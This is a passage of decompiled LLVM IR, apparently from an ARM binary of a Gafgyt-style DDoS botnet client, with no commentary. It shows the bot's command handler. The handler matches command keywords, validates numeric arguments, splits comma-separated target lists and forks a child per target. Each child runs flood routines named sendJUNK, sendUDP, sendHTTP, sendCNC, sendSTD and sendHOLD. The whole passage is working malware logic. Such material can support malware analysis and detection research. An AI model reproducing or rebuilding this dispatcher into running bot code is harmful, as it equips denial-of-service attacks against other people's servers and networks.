  %v3_11cc4 = inttoptr i32 %v2_11cb8 to i8*
  %v4_11cc4 = call i32 @__GI_strcoll(i8* %v3_11cc4, i32 ptrtoint ([5 x i8]* @global_var_23f10.1234 to i32))
  %v2_11ccc = icmp eq i32 %v4_11cc4, 0
  br i1 %v2_11ccc, label %dec_label_pc_11cd4, label %dec_label_pc_11e28

dec_label_pc_11cd4:                               ; preds = %dec_label_pc_11cb4
  %v7_11cdc = icmp slt i32 %arg1, 4
  br i1 %v7_11cdc, label %dec_label_pc_12bf0, label %dec_label_pc_11ce0

dec_label_pc_11ce0:                               ; preds = %dec_label_pc_11cd4
  %v1_11ce4 = add i32 %tmp, 8
  %v1_11ce8 = inttoptr i32 %v1_11ce4 to i32*
  %v2_11ce8 = load i32, i32* %v1_11ce8, align 4
  store i32 %v2_11ce8, i32* @r0, align 4
  %v1_11cf0 = call i32 @atol(i32 %v2_11ce8)
  %tmp132 = icmp slt i32 %v1_11cf0, 1
  br i1 %tmp132, label %dec_label_pc_12bf0, label %dec_label_pc_11d00

dec_label_pc_11d00:                               ; preds = %dec_label_pc_11ce0
  %v1_11d04 = add i32 %tmp, 12
  %v1_11d08 = inttoptr i32 %v1_11d04 to i32*
  %v2_11d08 = load i32, i32* %v1_11d08, align 4
  store i32 %v2_11d08, i32* @r0, align 4
  %v1_11d10 = call i32 @atol(i32 %v2_11d08)
  %v5_11d1c = icmp sgt i32 %v1_11d10, 0
  br i1 %v5_11d1c, label %dec_label_pc_11d24, label %dec_label_pc_12bf0

dec_label_pc_11d24:                               ; preds = %dec_label_pc_11d00
  %v1_11d28 = add i32 %tmp, 4
  %v1_11d2c = inttoptr i32 %v1_11d28 to i32*
  %v2_11d2c = load i32, i32* %v1_11d2c, align 4
  %v2_11d3c = load i32, i32* %v1_11ce8, align 4
  store i32 %v2_11d3c, i32* @r0, align 4
  %v1_11d44 = call i32 @atol(i32 %v2_11d3c)
  %v2_11d58 = load i32, i32* %v1_11d08, align 4
  store i32 %v2_11d58, i32* @r0, align 4
  %v1_11d60 = call i32 @atol(i32 %v2_11d58)
  %v2_11d78 = call i32 @__GI_strchr(i32 %v2_11d2c, i32 44)
  %v2_11d80 = icmp eq i32 %v2_11d78, 0
  br i1 %v2_11d80, label %dec_label_pc_11e00, label %dec_label_pc_11d88

dec_label_pc_11d88:                               ; preds = %dec_label_pc_11d24
  store i32 %v2_11d2c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_11d94 = call i32 @__GI_strtok(i32 %v2_11d2c, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_11df454 = icmp eq i32 %v2_11d94, 0
  br i1 %v2_11df454, label %dec_label_pc_11e28, label %dec_label_pc_11da4

dec_label_pc_11da4:                               ; preds = %dec_label_pc_11d88, %dec_label_pc_11ddc
  %storemerge2655 = phi i32 [ %v2_11de4, %dec_label_pc_11ddc ], [ %v2_11d94, %dec_label_pc_11d88 ]
  %v0_11da4 = call i32 @listFork()
  %v2_11dac = icmp eq i32 %v0_11da4, 0
  br i1 %v2_11dac, label %dec_label_pc_11db4, label %dec_label_pc_11ddc

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11da4
  %v4_11dc0 = call i32 @sendJUNK(i32 %storemerge2655, i32 %v1_11d44, i32 %v1_11d60, i32 0)
  %v2_11dc8 = load i32, i32* @global_var_2e45c.55, align 4
  %v1_11dd0 = call i32 @__GI_close(i32 %v2_11dc8)
  %v1_11dd8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11ddc:                               ; preds = %dec_label_pc_11da4
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_11de4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_11df4 = icmp eq i32 %v2_11de4, 0
  br i1 %v2_11df4, label %dec_label_pc_11e28, label %dec_label_pc_11da4

dec_label_pc_11e00:                               ; preds = %dec_label_pc_11d24
  %v0_11e00 = call i32 @listFork()
  %v2_11e08 = icmp eq i32 %v0_11e00, 0
  br i1 %v2_11e08, label %dec_label_pc_11e10, label %dec_label_pc_12bf0

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11e00
  %v4_11e1c = call i32 @sendJUNK(i32 %v2_11d2c, i32 %v1_11d44, i32 %v1_11d60, i32 0)
  %v1_11e24 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11e28:                               ; preds = %dec_label_pc_11ddc, %dec_label_pc_11d88, %dec_label_pc_11cb4
  %v2_11e2c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_23f18.1236 to i32), i32* @r1, align 4
  %v3_11e38 = inttoptr i32 %v2_11e2c to i8*
  %v4_11e38 = call i32 @__GI_strcoll(i8* %v3_11e38, i32 ptrtoint ([4 x i8]* @global_var_23f18.1236 to i32))
  %v2_11e40 = icmp eq i32 %v4_11e38, 0
  br i1 %v2_11e40, label %dec_label_pc_11e48, label %dec_label_pc_120d8

dec_label_pc_11e48:                               ; preds = %dec_label_pc_11e28
  %v7_11e50 = icmp slt i32 %arg1, 6
  br i1 %v7_11e50, label %dec_label_pc_12bf0, label %dec_label_pc_11e54

dec_label_pc_11e54:                               ; preds = %dec_label_pc_11e48
  %v1_11e58 = add i32 %tmp, 12
  %v1_11e5c = inttoptr i32 %v1_11e58 to i32*
  %v2_11e5c = load i32, i32* %v1_11e5c, align 4
  store i32 %v2_11e5c, i32* @r0, align 4
  %v1_11e64 = call i32 @atol(i32 %v2_11e5c)
  %v7_11e6c = icmp eq i32 %v1_11e64, -1
  br i1 %v7_11e6c, label %dec_label_pc_12bf0, label %dec_label_pc_11e74

dec_label_pc_11e74:                               ; preds = %dec_label_pc_11e54
  %v1_11e78 = add i32 %tmp, 8
  %v1_11e7c = inttoptr i32 %v1_11e78 to i32*
  %v2_11e7c = load i32, i32* %v1_11e7c, align 4
  store i32 %v2_11e7c, i32* @r0, align 4
  %v1_11e84 = call i32 @atol(i32 %v2_11e7c)
  %v7_11e8c = icmp eq i32 %v1_11e84, -1
  br i1 %v7_11e8c, label %dec_label_pc_12bf0, label %dec_label_pc_11e94

dec_label_pc_11e94:                               ; preds = %dec_label_pc_11e74
  %v1_11e98 = add i32 %tmp, 16
  %v1_11e9c = inttoptr i32 %v1_11e98 to i32*
  %v2_11e9c = load i32, i32* %v1_11e9c, align 4
  store i32 %v2_11e9c, i32* @r0, align 4
  %v1_11ea4 = call i32 @atol(i32 %v2_11e9c)
  %v7_11eac = icmp eq i32 %v1_11ea4, -1
  br i1 %v7_11eac, label %dec_label_pc_12bf0, label %dec_label_pc_11eb4

dec_label_pc_11eb4:                               ; preds = %dec_label_pc_11e94
  %v1_11eb8 = add i32 %tmp, 20
  %v1_11ebc = inttoptr i32 %v1_11eb8 to i32*
  %v2_11ebc = load i32, i32* %v1_11ebc, align 4
  store i32 %v2_11ebc, i32* @r0, align 4
  %v1_11ec4 = call i32 @atol(i32 %v2_11ebc)
  %v7_11ecc = icmp eq i32 %v1_11ec4, -1
  br i1 %v7_11ecc, label %dec_label_pc_12bf0, label %dec_label_pc_11ed4

dec_label_pc_11ed4:                               ; preds = %dec_label_pc_11eb4
  %v2_11edc = load i32, i32* %v1_11ebc, align 4
  store i32 %v2_11edc, i32* @r0, align 4
  %v1_11ee4 = call i32 @atol(i32 %v2_11edc)
  %v8_11ef8 = icmp sgt i32 %v1_11ee4, add (i32 ptrtoint (i32* @global_var_ff00.45 to i32), i32 220)
  br i1 %v8_11ef8, label %dec_label_pc_12bf0, label %dec_label_pc_11efc

dec_label_pc_11efc:                               ; preds = %dec_label_pc_11ed4
  %v2_11f04 = load i32, i32* %v1_11e9c, align 4
  store i32 %v2_11f04, i32* @r0, align 4
  %v1_11f0c = call i32 @atol(i32 %v2_11f04)
  %v8_11f18 = icmp sgt i32 %v1_11f0c, 32
  br i1 %v8_11f18, label %dec_label_pc_12bf0, label %dec_label_pc_11f1c

dec_label_pc_11f1c:                               ; preds = %dec_label_pc_11efc
  %v7_11f20 = icmp eq i32 %arg1, 7
  br i1 %v7_11f20, label %dec_label_pc_11f28, label %dec_label_pc_11f4c

dec_label_pc_11f28:                               ; preds = %dec_label_pc_11f1c
  %v1_11f2c = add i32 %tmp, 24
  %v1_11f30 = inttoptr i32 %v1_11f2c to i32*
  %v2_11f30 = load i32, i32* %v1_11f30, align 4
  store i32 %v2_11f30, i32* @r0, align 4
  %v1_11f38 = call i32 @atol(i32 %v2_11f30)
  %v5_11f44 = icmp sgt i32 %v1_11f38, 0
  br i1 %v5_11f44, label %dec_label_pc_11f4c, label %dec_label_pc_12bf0

dec_label_pc_11f4c:                               ; preds = %dec_label_pc_11f1c, %dec_label_pc_11f28
  %v1_11f50 = add i32 %tmp, 4
  %v1_11f54 = inttoptr i32 %v1_11f50 to i32*
  %v2_11f54 = load i32, i32* %v1_11f54, align 4
  %v2_11f64 = load i32, i32* %v1_11e7c, align 4
  store i32 %v2_11f64, i32* @r0, align 4
  %v1_11f6c = call i32 @atol(i32 %v2_11f64)
  %v2_11f80 = load i32, i32* %v1_11e5c, align 4
  store i32 %v2_11f80, i32* @r0, align 4
  %v1_11f88 = call i32 @atol(i32 %v2_11f80)
  %v2_11f9c = load i32, i32* %v1_11e9c, align 4
  store i32 %v2_11f9c, i32* @r0, align 4
  %v1_11fa4 = call i32 @atol(i32 %v2_11f9c)
  %v2_11fb8 = load i32, i32* %v1_11ebc, align 4
  store i32 %v2_11fb8, i32* @r0, align 4
  %v1_11fc0 = call i32 @atol(i32 %v2_11fb8)
  br i1 %v7_11f20, label %dec_label_pc_11fd8, label %dec_label_pc_11ff4

dec_label_pc_11fd8:                               ; preds = %dec_label_pc_11f4c
  %v1_11fdc = add i32 %tmp, 24
  %v1_11fe0 = inttoptr i32 %v1_11fdc to i32*
  %v2_11fe0 = load i32, i32* %v1_11fe0, align 4
  store i32 %v2_11fe0, i32* @r0, align 4
  %v1_11fe8 = call i32 @atol(i32 %v2_11fe0)
  br label %dec_label_pc_11ffc

dec_label_pc_11ff4:                               ; preds = %dec_label_pc_11f4c
  br label %dec_label_pc_11ffc

dec_label_pc_11ffc:                               ; preds = %dec_label_pc_11fd8, %dec_label_pc_11ff4
  %storemerge9 = phi i32 [ 10, %dec_label_pc_11ff4 ], [ %v1_11fe8, %dec_label_pc_11fd8 ]
  %v2_12010 = call i32 @__GI_strchr(i32 %v2_11f54, i32 44)
  %v2_12018 = icmp eq i32 %v2_12010, 0
  br i1 %v2_12018, label %dec_label_pc_1209c, label %dec_label_pc_12020

dec_label_pc_12020:                               ; preds = %dec_label_pc_11ffc
  store i32 %v2_11f54, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_1202c = call i32 @__GI_strtok(i32 %v2_11f54, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_1209051 = icmp eq i32 %v2_1202c, 0
  br i1 %v2_1209051, label %dec_label_pc_120d8, label %dec_label_pc_1203c

dec_label_pc_1203c:                               ; preds = %dec_label_pc_12020, %dec_label_pc_12078
  %storemerge2452 = phi i32 [ %v2_12080, %dec_label_pc_12078 ], [ %v2_1202c, %dec_label_pc_12020 ]
  %v0_1203c = call i32 @listFork()
  %v2_12044 = icmp eq i32 %v0_1203c, 0
  br i1 %v2_12044, label %dec_label_pc_1204c, label %dec_label_pc_12078

dec_label_pc_1204c:                               ; preds = %dec_label_pc_1203c
  %v6_1206c = call i32 @sendUDP(i32 %storemerge2452, i32 %v1_11f6c, i32 %v1_11f88, i32 %v1_11fa4, i32 %v1_11fc0, i32 %storemerge9)
  %v1_12074 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12078:                               ; preds = %dec_label_pc_1203c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_12080 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_12090 = icmp eq i32 %v2_12080, 0
  br i1 %v2_12090, label %dec_label_pc_120d8, label %dec_label_pc_1203c

dec_label_pc_1209c:                               ; preds = %dec_label_pc_11ffc
  %v0_1209c = call i32 @listFork()
  %v2_120a4 = icmp eq i32 %v0_1209c, 0
  br i1 %v2_120a4, label %dec_label_pc_120ac, label %dec_label_pc_12bf0

dec_label_pc_120ac:                               ; preds = %dec_label_pc_1209c
  %v6_120cc = call i32 @sendUDP(i32 %v2_11f54, i32 %v1_11f6c, i32 %v1_11f88, i32 %v1_11fa4, i32 %v1_11fc0, i32 %storemerge9)
  %v1_120d4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_120d8:                               ; preds = %dec_label_pc_12078, %dec_label_pc_12020, %dec_label_pc_11e28
  %v2_120dc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_23f1c.1238 to i32), i32* @r1, align 4
  %v3_120e8 = inttoptr i32 %v2_120dc to i8*
  %v4_120e8 = call i32 @__GI_strcoll(i8* %v3_120e8, i32 ptrtoint ([5 x i8]* @global_var_23f1c.1238 to i32))
  %v2_120f0 = icmp eq i32 %v4_120e8, 0
  br i1 %v2_120f0, label %dec_label_pc_120f8, label %dec_label_pc_122d8

dec_label_pc_120f8:                               ; preds = %dec_label_pc_120d8
  %v7_12100 = icmp slt i32 %arg1, 6
  br i1 %v7_12100, label %dec_label_pc_12bf0, label %dec_label_pc_12104

dec_label_pc_12104:                               ; preds = %dec_label_pc_120f8
  %v1_12108 = add i32 %tmp, 4
  %v1_1210c = inttoptr i32 %v1_12108 to i32*
  %v2_1210c = load i32, i32* %v1_1210c, align 4
  %v2_12118 = call i32 @__GI_strchr(i32 %v2_1210c, i32 44)
  %v2_12120 = icmp eq i32 %v2_12118, 0
  br i1 %v2_12120, label %dec_label_pc_12224, label %dec_label_pc_12128

dec_label_pc_12128:                               ; preds = %dec_label_pc_12104
  %v2_12130 = load i32, i32* %v1_1210c, align 4
  store i32 %v2_12130, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_1213c = call i32 @__GI_strtok(i32 %v2_12130, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_1221849 = icmp eq i32 %v2_1213c, 0
  br i1 %v2_1221849, label %dec_label_pc_122d8, label %dec_label_pc_1214c

dec_label_pc_1214c:                               ; preds = %dec_label_pc_12128, %dec_label_pc_12200
  %v0_1214c = call i32 @listFork()
  %v2_12154 = icmp eq i32 %v0_1214c, 0
  br i1 %v2_12154, label %dec_label_pc_1215c, label %dec_label_pc_12200

dec_label_pc_1215c:                               ; preds = %dec_label_pc_1214c
  %v2_12164 = load i32, i32* %v1_1210c, align 4
  store i32 %v2_12164, i32* @r5, align 4
  %v1_1216c = add i32 %tmp, 8
  %v1_12170 = inttoptr i32 %v1_1216c to i32*
  %v2_12170 = load i32, i32* %v1_12170, align 4
  store i32 %v2_12170, i32* @r6, align 4
  %v1_1217c = add i32 %tmp, 12
  %v1_12180 = inttoptr i32 %v1_1217c to i32*
  %v2_12180 = load i32, i32* %v1_12180, align 4
  store i32 %v2_12180, i32* @r0, align 4
  %v1_12188 = call i32 @atol(i32 %v2_12180)
  %v3_12194 = urem i32 %v1_12188, 65536
  store i32 %v3_12194, i32* @r7, align 4
  %v1_121a0 = add i32 %tmp, 16
  %v1_121a4 = inttoptr i32 %v1_121a0 to i32*
  %v2_121a4 = load i32, i32* %v1_121a4, align 4
  store i32 %v2_121a4, i32* @r8, align 4
  %v1_121b0 = add i32 %tmp, 20
  %v1_121b4 = inttoptr i32 %v1_121b0 to i32*
  %v2_121b4 = load i32, i32* %v1_121b4, align 4
  store i32 %v2_121b4, i32* @r0, align 4
  %v1_121bc = call i32 @atol(i32 %v2_121b4)
  store i32 %v1_121bc, i32* @r4, align 4
  %v1_121c8 = add i32 %tmp, 24
  %v1_121cc = inttoptr i32 %v1_121c8 to i32*
  %v2_121cc = load i32, i32* %v1_121cc, align 4
  store i32 %v2_121cc, i32* @r0, align 4
  %v1_121d4 = call i32 @atol(i32 %v2_121cc)
  %v0_121dc = load i32, i32* @r4, align 4
  %v0_121e4 = load i32, i32* @r5, align 4
  %v0_121e8 = load i32, i32* @r6, align 4
  %v0_121ec = load i32, i32* @r7, align 4
  %v0_121f0 = load i32, i32* @r8, align 4
  %v6_121f4 = trunc i32 %v0_121ec to i8
  %v7_121f4 = call i32 @sendHTTP(i32 %v0_121e4, i32 %v0_121e8, i8 %v6_121f4, i32 %v0_121f0, i32 %v0_121dc, i32 %v1_121d4)
  %v1_121fc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12200:                               ; preds = %dec_label_pc_1214c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_12208 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_12218 = icmp eq i32 %v2_12208, 0
  br i1 %v2_12218, label %dec_label_pc_122d8, label %dec_label_pc_1214c

dec_label_pc_12224:                               ; preds = %dec_label_pc_12104
  %v0_12224 = call i32 @listFork()
  %v2_1222c = icmp eq i32 %v0_12224, 0
  br i1 %v2_1222c, label %dec_label_pc_12234, label %dec_label_pc_12bf0

dec_label_pc_12234:                               ; preds = %dec_label_pc_12224
  %v2_1223c = load i32, i32* %v1_1210c, align 4
  store i32 %v2_1223c, i32* @r5, align 4
  %v1_12244 = add i32 %tmp, 8
  %v1_12248 = inttoptr i32 %v1_12244 to i32*
  %v2_12248 = load i32, i32* %v1_12248, align 4
  store i32 %v2_12248, i32* @r6, align 4
  %v1_12254 = add i32 %tmp, 12
  %v1_12258 = inttoptr i32 %v1_12254 to i32*
  %v2_12258 = load i32, i32* %v1_12258, align 4
  store i32 %v2_12258, i32* @r0, align 4
  %v1_12260 = call i32 @atol(i32 %v2_12258)
  %v3_1226c = urem i32 %v1_12260, 65536
  store i32 %v3_1226c, i32* @r7, align 4
  %v1_12278 = add i32 %tmp, 16
  %v1_1227c = inttoptr i32 %v1_12278 to i32*
  %v2_1227c = load i32, i32* %v1_1227c, align 4
  store i32 %v2_1227c, i32* @r8, align 4
  %v1_12288 = add i32 %tmp, 20
  %v1_1228c = inttoptr i32 %v1_12288 to i32*
  %v2_1228c = load i32, i32* %v1_1228c, align 4
  store i32 %v2_1228c, i32* @r0, align 4
  %v1_12294 = call i32 @atol(i32 %v2_1228c)
  store i32 %v1_12294, i32* @r4, align 4
  %v1_122a0 = add i32 %tmp, 24
  %v1_122a4 = inttoptr i32 %v1_122a0 to i32*
  %v2_122a4 = load i32, i32* %v1_122a4, align 4
  store i32 %v2_122a4, i32* @r0, align 4
  %v1_122ac = call i32 @atol(i32 %v2_122a4)
  %v0_122b4 = load i32, i32* @r4, align 4
  %v0_122bc = load i32, i32* @r5, align 4
  %v0_122c0 = load i32, i32* @r6, align 4
  %v0_122c4 = load i32, i32* @r7, align 4
  %v0_122c8 = load i32, i32* @r8, align 4
  %v6_122cc = trunc i32 %v0_122c4 to i8
  %v7_122cc = call i32 @sendHTTP(i32 %v0_122bc, i32 %v0_122c0, i8 %v6_122cc, i32 %v0_122c8, i32 %v0_122b4, i32 %v1_122ac)
  %v1_122d4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_122d8:                               ; preds = %dec_label_pc_12200, %dec_label_pc_12128, %dec_label_pc_120d8
  %v2_122dc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_23f24.1240 to i32), i32* @r1, align 4
  %v3_122e8 = inttoptr i32 %v2_122dc to i8*
  %v4_122e8 = call i32 @__GI_strcoll(i8* %v3_122e8, i32 ptrtoint ([4 x i8]* @global_var_23f24.1240 to i32))
  %v2_122f0 = icmp eq i32 %v4_122e8, 0
  br i1 %v2_122f0, label %dec_label_pc_122f8, label %dec_label_pc_1244c

dec_label_pc_122f8:                               ; preds = %dec_label_pc_122d8
  %v7_12300 = icmp slt i32 %arg1, 4
  br i1 %v7_12300, label %dec_label_pc_12bf0, label %dec_label_pc_12304

dec_label_pc_12304:                               ; preds = %dec_label_pc_122f8
  %v1_12308 = add i32 %tmp, 8
  %v1_1230c = inttoptr i32 %v1_12308 to i32*
  %v2_1230c = load i32, i32* %v1_1230c, align 4
  store i32 %v2_1230c, i32* @r0, align 4
  %v1_12314 = call i32 @atol(i32 %v2_1230c)
  %tmp133 = icmp slt i32 %v1_12314, 1
  br i1 %tmp133, label %dec_label_pc_12bf0, label %dec_label_pc_12324

dec_label_pc_12324:                               ; preds = %dec_label_pc_12304
  %v1_12328 = add i32 %tmp, 12
  %v1_1232c = inttoptr i32 %v1_12328 to i32*
  %v2_1232c = load i32, i32* %v1_1232c, align 4
  store i32 %v2_1232c, i32* @r0, align 4
  %v1_12334 = call i32 @atol(i32 %v2_1232c)
  %v5_12340 = icmp sgt i32 %v1_12334, 0
  br i1 %v5_12340, label %dec_label_pc_12348, label %dec_label_pc_12bf0

dec_label_pc_12348:                               ; preds = %dec_label_pc_12324
  %v1_1234c = add i32 %tmp, 4
  %v1_12350 = inttoptr i32 %v1_1234c to i32*
  %v2_12350 = load i32, i32* %v1_12350, align 4
  %v2_12360 = load i32, i32* %v1_1230c, align 4
  store i32 %v2_12360, i32* @r0, align 4
  %v1_12368 = call i32 @atol(i32 %v2_12360)
  %v2_1237c = load i32, i32* %v1_1232c, align 4
  store i32 %v2_1237c, i32* @r0, align 4
  %v1_12384 = call i32 @atol(i32 %v2_1237c)
  %v2_1239c = call i32 @__GI_strchr(i32 %v2_12350, i32 44)
  %v2_123a4 = icmp eq i32 %v2_1239c, 0
  br i1 %v2_123a4, label %dec_label_pc_12424, label %dec_label_pc_123ac

dec_label_pc_123ac:                               ; preds = %dec_label_pc_12348
  store i32 %v2_12350, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_123b8 = call i32 @__GI_strtok(i32 %v2_12350, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_1241846 = icmp eq i32 %v2_123b8, 0
  br i1 %v2_1241846, label %dec_label_pc_1244c, label %dec_label_pc_123c8

dec_label_pc_123c8:                               ; preds = %dec_label_pc_123ac, %dec_label_pc_12400
  %storemerge2047 = phi i32 [ %v2_12408, %dec_label_pc_12400 ], [ %v2_123b8, %dec_label_pc_123ac ]
  %v0_123c8 = call i32 @listFork()
  %v2_123d0 = icmp eq i32 %v0_123c8, 0
  br i1 %v2_123d0, label %dec_label_pc_123d8, label %dec_label_pc_12400

dec_label_pc_123d8:                               ; preds = %dec_label_pc_123c8
  %v4_123e4 = call i32 @sendCNC(i32 %storemerge2047, i32 %v1_12368, i32 %v1_12384, i32 0)
  %v2_123ec = load i32, i32* @global_var_2e45c.55, align 4
  %v1_123f4 = call i32 @__GI_close(i32 %v2_123ec)
  %v1_123fc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12400:                               ; preds = %dec_label_pc_123c8
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_12408 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_12418 = icmp eq i32 %v2_12408, 0
  br i1 %v2_12418, label %dec_label_pc_1244c, label %dec_label_pc_123c8

dec_label_pc_12424:                               ; preds = %dec_label_pc_12348
  %v0_12424 = call i32 @listFork()
  %v2_1242c = icmp eq i32 %v0_12424, 0
  br i1 %v2_1242c, label %dec_label_pc_12434, label %dec_label_pc_12bf0

dec_label_pc_12434:                               ; preds = %dec_label_pc_12424
  %v4_12440 = call i32 @sendCNC(i32 %v2_12350, i32 %v1_12368, i32 %v1_12384, i32 0)
  %v1_12448 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_1244c:                               ; preds = %dec_label_pc_12400, %dec_label_pc_123ac, %dec_label_pc_122d8
  %v2_12450 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_23f28.1242 to i32), i32* @r1, align 4
  %v3_1245c = inttoptr i32 %v2_12450 to i8*
  %v4_1245c = call i32 @__GI_strcoll(i8* %v3_1245c, i32 ptrtoint ([6 x i8]* @global_var_23f28.1242 to i32))
  %v2_12464 = icmp eq i32 %v4_1245c, 0
  br i1 %v2_12464, label %dec_label_pc_1246c, label %dec_label_pc_12600

dec_label_pc_1246c:                               ; preds = %dec_label_pc_1244c
  %v7_12474 = icmp slt i32 %arg1, 4
  br i1 %v7_12474, label %dec_label_pc_12bf0, label %dec_label_pc_12478

dec_label_pc_12478:                               ; preds = %dec_label_pc_1246c
  %v1_1247c = add i32 %tmp, 8
  %v1_12480 = inttoptr i32 %v1_1247c to i32*
  %v2_12480 = load i32, i32* %v1_12480, align 4
  store i32 %v2_12480, i32* @r0, align 4
  %v1_12488 = call i32 @atol(i32 %v2_12480)
  %tmp134 = icmp slt i32 %v1_12488, 1
  br i1 %tmp134, label %dec_label_pc_12bf0, label %dec_label_pc_12498

dec_label_pc_12498:                               ; preds = %dec_label_pc_12478
  %v1_1249c = add i32 %tmp, 12
  %v1_124a0 = inttoptr i32 %v1_1249c to i32*
  %v2_124a0 = load i32, i32* %v1_124a0, align 4
  store i32 %v2_124a0, i32* @r0, align 4
  %v1_124a8 = call i32 @atol(i32 %v2_124a0)
  %v5_124b4 = icmp sgt i32 %v1_124a8, 0
  br i1 %v5_124b4, label %dec_label_pc_124bc, label %dec_label_pc_12bf0

dec_label_pc_124bc:                               ; preds = %dec_label_pc_12498
  %v1_124c0 = add i32 %tmp, 4
  %v1_124c4 = inttoptr i32 %v1_124c0 to i32*
  %v2_124c4 = load i32, i32* %v1_124c4, align 4
  %v2_124d4 = load i32, i32* %v1_12480, align 4
  store i32 %v2_124d4, i32* @r0, align 4
  %v1_124dc = call i32 @atol(i32 %v2_124d4)
  %v2_124f0 = load i32, i32* %v1_124a0, align 4
  store i32 %v2_124f0, i32* @r0, align 4
  %v1_124f8 = call i32 @atol(i32 %v2_124f0)
  %v2_12510 = call i32 @__GI_strchr(i32 %v2_124c4, i32 44)
  %v2_12518 = icmp eq i32 %v2_12510, 0
  br i1 %v2_12518, label %dec_label_pc_125b8, label %dec_label_pc_12520

dec_label_pc_12520:                               ; preds = %dec_label_pc_124bc
  store i32 %v2_124c4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_1252c = call i32 @__GI_strtok(i32 %v2_124c4, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_125ac43 = icmp eq i32 %v2_1252c, 0
  br i1 %v2_125ac43, label %dec_label_pc_12600, label %dec_label_pc_1253c

dec_label_pc_1253c:                               ; preds = %dec_label_pc_12520, %dec_label_pc_12594
  %storemerge1844 = phi i32 [ %v2_1259c, %dec_label_pc_12594 ], [ %v2_1252c, %dec_label_pc_12520 ]
  %v0_1253c = call i32 @listFork()
  %v2_12544 = icmp eq i32 %v0_1253c, 0
  br i1 %v2_12544, label %dec_label_pc_1254c, label %dec_label_pc_12594

dec_label_pc_1254c:                               ; preds = %dec_label_pc_1253c
  %v4_12558 = call i32 @sendJUNK(i32 %storemerge1844, i32 %v1_124dc, i32 %v1_124f8, i32 0)
  %v3_12568 = call i32 @sendSTD(i32 %storemerge1844, i32 %v1_124dc, i32 %v1_124f8)
  %v3_12578 = call i32 @sendHOLD(i32 %storemerge1844, i32 %v1_124dc, i32 %v1_124f8)
  %v2_12580 = load i32, i32* @global_var_2e45c.55, align 4
  %v1_12588 = call i32 @__GI_close(i32 %v2_12580)
  %v1_12590 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12594:                               ; preds = %dec_label_pc_1253c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_1259c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_125ac = icmp eq i32 %v2_1259c, 0
  br i1 %v2_125ac, label %dec_label_pc_12600, label %dec_label_pc_1253c

dec_label_pc_125b8:                               ; preds = %dec_label_pc_124bc
  %v0_125b8 = call i32 @listFork()
  %v2_125c0 = icmp eq i32 %v0_125b8, 0
  br i1 %v2_125c0, label %dec_label_pc_125c8, label %dec_label_pc_12bf0

dec_label_pc_125c8:                               ; preds = %dec_label_pc_125b8
  %v4_125d4 = call i32 @sendJUNK(i32 %v2_124c4, i32 %v1_124dc, i32 %v1_124f8, i32 0)
  %v3_125e4 = call i32 @sendSTD(i32 %v2_124c4, i32 %v1_124dc, i32 %v1_124f8)
  %v3_125f4 = call i32 @sendHOLD(i32 %v2_124c4, i32 %v1_124dc, i32 %v1_124f8)
  %v1_125fc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12600:                               ; preds = %dec_label_pc_12594, %dec_label_pc_12520, %dec_label_pc_1244c
  %v2_12604 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_23f30.1244 to i32), i32* @r1, align 4
  %v3_12610 = inttoptr i32 %v2_12604 to i8*
  %v4_12610 = call i32 @__GI_strcoll(i8* %v3_12610, i32 ptrtoint ([4 x i8]* @global_var_23f30.1244 to i32))
  %v2_12618 = icmp eq i32 %v4_12610, 0
  br i1 %v2_12618, label %dec_label_pc_12620, label %dec_label_pc_12764

dec_label_pc_12620:                               ; preds = %dec_label_pc_12600
